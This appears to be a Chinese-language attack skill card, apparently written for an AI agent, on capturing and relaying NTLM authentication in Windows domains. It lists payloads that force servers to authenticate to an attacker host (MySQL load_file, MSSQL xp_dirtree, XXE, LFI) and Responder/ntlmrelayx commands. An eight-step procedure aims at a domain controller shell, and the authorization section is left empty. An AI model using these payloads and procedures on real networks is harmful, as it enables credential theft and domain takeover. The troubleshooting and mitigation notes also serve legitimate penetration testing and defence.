# NTLM 带外窃取与中继

## R — 原文 (Reading)

> 这个不妨碍我们在未校验 smb 签名等情况下进行 NTLM-Relay 转发。我们执行 responder，首先关闭掉 smb，给接下来的 ntlmrelayx 使用。

> — 《域渗透一条龙》· 7. relay / poisoning 攻击

> 此方式默认攻击目标是特权用户，并且目标不能有 SMB 签名。

> — 163 酒仙桥六号部队《NTLM 的基操》· 攻击方式 / Multi-relay

> In 2016 however, Microsoft published a security bulletin MS16-077, which mitigated this attack by adding two important protections: The location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.

> — 《红蓝对抗之Windows内网渗透》· 5.3.2 WPAD

## I — 方法论骨架 (Interpretation)

这个能力解决的是「不破解、不猜口令，直接借用别人的一次认证过程来拿权限」。它有三段，每段都有独立的前提，必须分开验证。

**第一段：让目标主动发起认证（触发源）。** Windows 在访问 UNC 路径（`\\host\share`）时会自动发起 SMB 认证，并把当前进程账号的 Net-NTLM 响应交给对端。于是任何「能让目标去解析一个 URL/路径」的原语都能变成凭据窃取：
- MySQL：`select load_file('\\\\attacker\\x')` / `select 'x' into outfile '\\\\attacker\\x'` / `into dumpfile`
- MSSQL：`exec master.dbo.xp_dirtree '\\attacker\test'`
- LFI：`?page=\\attacker\share`
- XXE：`<!ENTITY xxe SYSTEM "php://filter/...resource=//attacker/abc">`
- XPath：`doc('//attacker/abc')`

另一类触发源是名称解析毒化（LLMNR/NBT-NS/WPAD）与强制认证（PetitPotam / printerbug / mitm6）。这两类的失效方式不同：前者受补丁影响，后者受协议可达性影响。

**第二段：判断这次认证能不能被用（不校验 + 有落点）。**
- 中继（把 A 的认证转给 B）需要 **B 不要求 SMB 签名**——否则 B 拒绝接受这次认证，且**没有任何报错提示**，只在协议层静默失败。
- 落点决定收益：SMB → 直接执行命令；LDAP → 赋权或写 RBCD；ADCS → 申请证书换 TGT；EWS → 邮件面。
- 操作前提：**攻击机必须先关掉自己的 SMB/HTTP**，否则 Responder 会自己接住认证而不转发（表现为「抓到 hash 但没有会话」）。

**第三段：这个值能干什么（形态判定）。** Net-NTLM（response）是「用密码 hash 加密服务器 challenge」的产物，会话相关，**不能重放成登录**，所以不能 P2H；它只能离线爆破（hashcat `-m 5500/5600`）或中继。这一点与本卡的因果关系最容易搞反：不是「中继比 P2H 弱」，而是「中继不需要知道 hash，只需要有人来认证」。

**排障的关键是把「哪一段断了」定位出来**，而不是换工具：
- Responder 完全收不到请求 → 名称解析路径变了（MS16-077 之后客户端不再通过广播找 WPAD，只查 DNS），或者不在同一广播域。
- 收到请求但拿不到可用结果 → 认证行为变了（不再自动向服务器认证，401 钓鱼失效），或目标要求签名。
- 大范围扫描显示 `SMB signing: True` → 整类中继失效，不用试。

## A1 — 应用示例 (Application Example)

### 示例 1: MySQL `load_file` 抓 Net-NTLMv2
- **类型与来源**: 【亲历】163 酒仙桥六号部队《NTLM 的基操》· Net-NTLM hash / 获取方式
- **问题/输入**: 已有一个 MySQL 注入点/数据库账号，攻击机与目标出站 445 可达。
- **方法论的使用**: 攻击机起 Responder（Linux，Windows 不支持）；先查 `select @@secure_file_priv` 确认不为 NULL；构造 `select load_file('\\\\192.168.0.102\\1')`（或 `into outfile` / `into dumpfile`）让数据库进程去解析 UNC 路径；Responder 日志出现该主机的 Net-NTLMv2 响应。同文还列出 MSSQL `xp_dirtree`、LFI、XXE、XPath 四类等价入口。
- **结论**: 攻击点不是「数据库漏洞」，而是「任何能让目标去访问 UNC 路径的原语」。
- **结果**: 原书在 DVWA + phpstudy（MySQL 5.7.26）复现成功；同时记录失败面——新版 MySQL 默认 `secure_file_priv` 为 NULL 时 `load_file` 直接不可用，目标出站 445 被封时全部入口失效，`into outfile` 会写文件可能破坏业务。

### 示例 2: MultiRelay 中继到域管机器
- **类型与来源**: 【亲历】《红蓝对抗之Windows内网渗透》· 5.3 NTLM-Relay 实验；【亲历】163《NTLM 的基操》· Multi-relay
- **问题/输入**: 域环境；一台普通域用户机器（Win7）、一台域管登录的机器（Win10）、一台 DC（dcserver）。
- **方法论的使用**: ① `python RunFinger.py -i <网段>` 或 `cme smb $hosts --gen-relay-list relay.txt` 探测签名情况，看到 `SMB signing: False` 才继续；② 编辑 `Responder.conf`，把 SMB 与 HTTP 设为 Off（避免与中继工具抢端口）；③ `./Responder.py -I eth0 -wvrf` 只做毒化，另起 `ntlmrelayx.py -tf targets.txt`（或 `python MultiRelay.py -t <目标> -u ALL`）；④ 触发目标发起认证（等待 LLMNR 解析失败、或用 PetitPotam/printerbug 强制），域管机器访问不存在主机时的认证被中继到 DC，拿到 shell。
- **结论**: 三个条件必须同时为真——触发源、目标不校验签名、有可用落点；外加「关掉本机 SMB/HTTP」这个操作前提。
- **结果**: 原书交代成功获得 DC shell；也记录了「不关本机 SMB/HTTP 会表现为抓到 hash 但没有会话」这一典型误判。

### 示例 3: LLMNR/WPAD 在补丁环境里为什么突然不灵
- **类型与来源**: 【亲历】《红蓝对抗之Windows内网渗透》· 5.3.1 LLMNR、5.3.2 WPAD（四轮演示）
- **问题/输入**: Responder 正常运行，但「没收到东西」或「弹框拿到了但没明文」。
- **方法论的使用**: 先二分：Responder 是否收到任何请求——收到说明链路可达但认证行为变了；收不到说明名称解析路径变了。核对目标是否已打 MS16-077（之后客户端不再通过广播找 WPAD，只查 DNS，且不再自动向服务器认证）→ 广播毒化与 401 钓鱼同时失效。处置方向是换信道（`mitm6` 让客户端把我们当 IPv6 DNS 服务器，再走 WPAD 或 relay）或换攻击（转强制认证触发）。
- **结论**: 现象相同、原因分层，处置必须按层走；换工具解决不了「客户端不再广播」这个事实。
- **结果**: 原书四轮演示（LLMNR v1.0、WPAD v1.0/v1.1/v2.0）并逐轮标注域内/非域内差异，明确警告「在非域机器上验证成功」不等于「在真实目标上可行」。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. Responder 抓到了 hash 但没有会话，需要判断断在哪一段。
2. 想用 NTLM 中继但不确定目标签名情况与落点。
3. 有一个「能让目标访问 URL」的原语（数据库、XXE、LFI），需要判断能否转成凭据窃取。
4. 域内 LLMNR/WPAD 毒化突然不灵，需要判断是补丁还是拓扑问题。
5. 拿到 Net-NTLM 后需要决定爆破、中继还是放弃。

### 语言信号（出现这些就该激活）
- 中文：「NTLM relay 需要什么条件」「Responder 抓到 hash 但没 shell」「relay to ldap/adcs」「responder 没反应」「WPAD 不弹框」「怎么抓 net-ntlm」「responder 收不到 hash」「responder 和 multirelay 冲突」
- English: "ntlm relay prerequisites", "smb signing check", "relay to ldap", "llmnr poisoning not working", "force authentication unc path", "mysql load_file capture hash"

### 与相邻能力的区分
- 与 `credential-extraction` 的区别：那边取的是**静态 NTLM hash / 明文**（可 P2H），本卡拿的是**会话相关的 Net-NTLM**（不可 P2H，只能爆破或中继）。
- 与 `lateral-execution-channels` 的区别：那边需要已知凭据；本卡不需要知道密码，只需要有人来认证。
- 与 `domain-recon-path` 的区别：签名探测是侦察动作，但本卡的判断对象是「认证能不能被借用」，不是「域结构长什么样」。

## E — 可执行步骤 (Execution)

**必需输入**: ①与目标同二层/同广播域的可达位置（毒化类）或一个强制认证触发点（PetitPotam/printerbug/mitm6）；②目标网段的签名情况；③一个可用落点（SMB/LDAP/ADCS/EWS 之一）；④攻击机（Linux，Responder 不支持 Windows）。缺 ③ 时本卡只能做「窃取 + 爆破」，不能做中继。
**交付物与完成标准**: 一份「认证借用记录」：触发方式、捕获到的响应（含形态 Net-NTLMv1/v2）、落点与结果、失败段定位（若失败）。完成标准是拿到会话/赋权/证书之一，或明确写下「断在第几段、为什么」。

1. **探签名，先做去留判断**
   - 做什么：`nmap --script smb-security-mode -p445` 或 `cme smb $hosts --gen-relay-list relay.txt`；`python RunFinger.py -i <网段>`。
   - 完成标准：得到「哪些主机 `SMB signing: False`」的清单。
   - 判停：若目标全部强制签名，SMB 中继整类失效——不要试，直接转 LDAP/ADCS 落点或转爆破。

2. **确认落点可用**
   - 做什么：按目标环境判断——LDAP（能否赋权/写 RBCD）、ADCS（是否有可申请的证书模板）、SMB（能否执行命令）、EWS（邮件面）。
   - 完成标准：至少一个落点成立。
   - 判停：若只有 SMB 落点且签名强制，本卡中继路线不成立，转第 7 步只做窃取。

3. **关掉本机 SMB/HTTP（必须先做）**
   - 做什么：编辑 `Responder.conf`，把 SMB 与 HTTP 置 Off；确认没有其它服务占用 445/80。
   - 完成标准：本机不再应答 SMB/HTTP。
   - 判停：若忘记这一步，现象是「抓到 hash 但没有会话」——看到这个现象先回来检查本步，不要怀疑落点。

4. **选触发源**
   - 做什么：毒化类（Responder 监听 LLMNR/NBT-NS/WPAD）或强制类（PetitPotam / printerbug / mitm6）。毒化类要求同广播域；强制类要求目标能回连且相应协议可达。
   - 完成标准：选定一种，并写下它依赖的协议与端口。
   - 判停：若 Responder 完全收不到请求，说明名称解析路径变了（MS16-077 之后不再广播找 WPAD），转第 5 步；若收到但无可用结果，说明认证行为变了，也转第 5 步。

5. **按补丁层排障**
   - 做什么：核对目标补丁级别（MS16-077 是否已打）；已缓解则改用 `mitm6`（让客户端把我们当 IPv6 DNS 服务器）再走 WPAD 或 relay；或改用 `xp_dirtree`/`load_file`/XXE 这类「应用层强制认证」。
   - 完成标准：能拿到一次真实的认证响应。
   - 判停：若目标为域内机器且补丁齐全、浏览器策略严格，毒化类大概率不通——不要在非域机器上的成功经验上继续加码。

6. **中继并验证落点**
   - 做什么：`ntlmrelayx.py -tf targets.txt`（或 `MultiRelay.py -t <目标> -u ALL`）接收转发；按落点分支执行（SMB 执行命令 / LDAP 赋权或写 RBCD / ADCS 申请证书换 TGT）。
   - 完成标准：拿到会话、赋权成功或证书签发成功，并有可核验证据（`whoami`、组成员变化、证书文件）。
   - 判停：若中继成功但只得到空 token，说明被中继的身份在目标上非特权——换落点或换目标，不是工具问题。

7. **只窃取时：判形态并分流**
   - 做什么：看捕获值形态——Net-NTLMv1（`-m 5500`）/ Net-NTLMv2（`-m 5600`）→ 离线爆破；或转中继。**不得**把 Net-NTLM 放进 P2H 队列。
   - 完成标准：形态已标注；爆破任务已排队或已放弃。
   - 判停：若口令强度高（长随机），爆破不现实，本卡结束，转 `credential-extraction` 找配置层明文。

8. **记录暴露面**
   - 做什么：记录毒化持续时间、被毒化的主机数、是否引发 ARP/名称解析异常告警；停止 Responder 并恢复网络配置。
   - 完成标准：暴露面可量化，环境已恢复。
   - 判停：若期间出现大面积解析失败（业务中断迹象），立即停止——这类动作对生产的副作用是即时的。

## B — 边界 (Boundary) ★

### 不要用的情况
- 全域强制 SMB 签名 + 禁用 NTLM：SMB 中继整类失效，且没有 LDAP/ADCS 落点时整条链不成立。
- 目标已全面禁用 LLMNR/NBT-NS 且部署了 WPAD 的 DNS 白名单：毒化类触发源归零。
- 生产网络对 ARP/名称解析异常零容忍：毒化会直接影响业务解析，副作用即时且可见。
- 只想验证「口令强度」：本卡产出的是会话借用，不回答口令强度问题（那是 `password-attack-reuse`）。

### 已知失败模式
- **不关本机 SMB/HTTP**：Responder 自己接住认证不转发，表现为「抓到 hash 但没有会话」。
- **把签名强制当工具问题**：目标签名强制时中继静默失败、无报错，换工具无用。
- **MS08-068 相关场景已修复**：书中明确「这个漏洞很早就在 MS08-068 补丁中被修复了」，老教程里的「中继回本机」不可用。
- **在非域机器上验证成功就当通用可行**：215 演示中作者实测成功案例「还是在非域内机器」，域内机器补丁齐、策略严，真实目标上常失败。
- **`load_file` 不看 `secure_file_priv`**：新版 MySQL 默认为 NULL，直接不可用。
- **目标出站 445 被封**：所有 UNC 触发入口同时失效。
- **`into outfile` 写文件破坏业务**：这是有副作用的原语，不是纯读取。
- **把 Net-NTLM 拿去 P2H**：形态错，必然失败。
- **中继到非特权账号**：只能得到空 token，误判为「中继失败」。

### 作者与时代的局限
- 案例环境为 2019–2021 年的 Win7/Win10/Server 2012R2。当前主流环境：SMB 签名默认强制（Win10 24H2 起客户端默认签名）、NTLM 全面审计甚至禁用、LLMNR/mDNS 在多数终端管理基线中被关闭，本卡三类触发源的可用性显著下降。
- 未覆盖 NTLM over HTTP 的 EPA（Extended Protection for Authentication）与 LDAP signing/channel binding——这两项在现代 AD 中常默认开启，会直接杀死 LDAP 与 HTTP 落点。
- 未讨论 ADCS 的 ESC 系列（ESC1–ESC11）：书中只把 ADCS 当「落点」，未展开证书模板配置错误的判定，这在实际利用中是主要瓶颈。
- 未讨论云/混合环境：Entra ID 的 NTLM 使用被逐步淘汰，本卡在纯云身份架构中无适用面。

### 容易混淆的方法
- **中继 vs 爆破**：中继是「借在线认证」，爆破是「离线算口令」。Net-NTLM 两条都能走，但代价完全不同。
- **毒化 vs 强制认证**：毒化等目标自己出错（解析失败），强制认证主动让目标来连我（PetitPotam/printerbug）。前者受补丁影响，后者受协议可达性影响。
- **NTLM 中继 vs Kerberos 中继**：本卡全是 NTLM；Kerberos 侧对应的是委派滥用（见 `kerberos-ticket-abuse`）。
- **签名探测 vs 漏洞扫描**：签名探测只回答「这次认证会不会被接受」，不产出漏洞清单。

### 授权与合规边界
> 待补充（用户自行填写）
